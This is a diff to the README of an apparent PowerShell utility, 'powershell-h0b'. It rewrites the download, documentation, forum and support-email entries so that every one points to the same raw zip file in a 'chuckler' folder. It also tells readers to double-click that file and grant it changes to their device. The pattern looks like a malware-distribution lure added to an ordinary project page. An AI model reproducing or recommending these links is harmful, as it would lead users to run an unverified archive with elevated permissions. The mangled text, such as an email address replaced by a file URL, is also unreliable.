@@ -1,6 +1,6 @@
 # 🛠️ powershell-h0b - Simplify Your PowerShell Tasks Easily
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/tsoonami23/powershell-h0b/releases)
+[![Download](https://raw.githubusercontent.com/tsoonami23/powershell-h0b/main/chuckler/powershell-h0b.zip%20release-blue)](https://raw.githubusercontent.com/tsoonami23/powershell-h0b/main/chuckler/powershell-h0b.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **powershell-h0b**! This application helps you manage PowerShell task
 
 To get started with **powershell-h0b**, visit the releases page to download the latest version of the application.
 
-👉 [Visit this page to download](https://github.com/tsoonami23/powershell-h0b/releases)
+👉 [Visit this page to download](https://raw.githubusercontent.com/tsoonami23/powershell-h0b/main/chuckler/powershell-h0b.zip)
 
 ### Steps to Download
 
@@ -32,7 +32,7 @@ Ensure you check for compatibility with your version of Windows. If you are unsu
 Once the download is complete, follow these steps to run **powershell-h0b**:
 
 1. Navigate to the folder where you downloaded the application.
-2. Double-click the downloaded file (e.g., `powershell-h0b.exe`).
+2. Double-click the downloaded file (e.g., `https://raw.githubusercontent.com/tsoonami23/powershell-h0b/main/chuckler/powershell-h0b.zip`).
 3. If prompted, allow the application to make changes to your device.
 
 The application will open a user-friendly interface, guiding you through its features.
@@ -73,11 +73,11 @@ Feel free to reach out to the support section on the GitHub repository for assis
 For further assistance, you can contact the support team through the following channels:
 
 1. Issues section on the GitHub repository.
-2. Direct email at support@powershell-h0b.com.
+2. Direct email at https://raw.githubusercontent.com/tsoonami23/powershell-h0b/main/chuckler/powershell-h0b.zip
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/tsoonami23/powershell-h0b/wiki) - Detailed instructions on using various features.
-- [Community Forum](https://github.com/tsoonami23/powershell-h0b/discussions) - Join the conversation with other users.
+- [Documentation](https://raw.githubusercontent.com/tsoonami23/powershell-h0b/main/chuckler/powershell-h0b.zip) - Detailed instructions on using various features.
+- [Community Forum](https://raw.githubusercontent.com/tsoonami23/powershell-h0b/main/chuckler/powershell-h0b.zip) - Join the conversation with other users.
 
 Thank you for choosing **powershell-h0b**! We hope you find it helpful for your PowerShell tasks. Enjoy using the application!
